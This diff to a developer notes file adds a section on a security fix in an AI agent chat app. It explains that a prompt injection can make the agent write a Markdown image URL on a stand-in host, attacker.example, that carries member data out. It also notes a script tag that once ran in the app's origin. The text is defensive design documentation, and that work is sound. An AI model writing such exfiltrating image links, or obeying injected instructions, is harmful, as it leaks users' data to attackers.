@@ -2064,6 +2064,37 @@ scrollbars.** Playwright's headless Chromium starts with `--hide-scrollbars`,
 so a capture shows no bar even where the box scrolls. Pass
 `ignoreDefaultArgs: ["--hide-scrollbars"]` before you judge a scroll box.
 
+### 14.8 A remote image loads only on a click (security fix, 2026-10-04)
+
+**The threat.** An attacker can steer the text of an agent's reply. A prompt
+injection in an email, a web page, a file or a task can make the agent write
+`![](https://attacker.example/p.png?d=<member data>)`. Before this fix, the
+bubble drew that image at once, and the browser sent the data out. No tool
+ran and no card showed.
+
+**The rule.** A Markdown image whose URL leaves the app's origin does not load
+when it renders. It draws as a placeholder with the alt text, the host and a
+"Load image" button. Only the member's click loads it. A `data:` image and a
+same-origin or workspace path load at once.
+
+**One gate.** `src/lib/markdownMedia.ts` decides, and
+`src/components/MarkdownImage.tsx` draws. Every renderer of agent Markdown
+uses them: `MarkdownBody`, `ThinkingContainer`, `ArtifactViewerModal` and
+`DocumentPane`. A same-origin URL that names another URL in its query is
+remote, because `/api/email/image-proxy?url=` fetches that URL on the server.
+
+**Raw HTML.** `ArtifactViewerModal` and `DocumentPane` run `rehype-raw`, and
+`rehypeGateRemoteMedia` runs after it. It removes `script`, `style`, `link`,
+`meta`, `base`, `title`, `template`, `iframe`, `object` and `embed`. It strips
+each remote `src`, `srcset`, `poster`, `background` and CSS `url()` from the
+rest. Before this fix, an agent `.md` file with `<script async src>` ran that
+script in the app's origin, because React 19 hoists an async script and loads
+it. An email attachment opens in the same viewer.
+
+**Fences.** `src/components/markdownImage.test.ts` and
+`src/lib/markdownMedia.test.ts`. The app sends no CSP that limits `img-src`.
+H-238 holds that follow-up.
+
 ---
 
 ## 15. Entity pills in the chat (S9)
